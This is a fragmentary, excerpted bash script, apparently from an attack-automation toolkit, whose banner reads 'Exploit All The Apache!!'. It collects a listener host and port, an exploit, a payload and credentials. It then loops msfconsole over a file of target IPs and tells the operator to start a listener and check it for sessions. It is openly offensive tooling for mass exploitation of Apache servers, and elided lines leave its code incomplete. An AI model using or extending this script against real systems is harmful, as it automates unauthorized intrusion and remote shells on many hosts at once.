...
;;
 ...
 echo -e "\E[1;34m::::: \e[97mExploit All The Apache!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri; read -p 'Set HttpPassword: (Blank if none)' userpassword; read -p 'Set HttpUsername: (Blank if none)' userusername;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	...
	exit"
            ...
            echo -e "\E[1;34m::::: \e[97mAll Apache Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
...
options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Run")
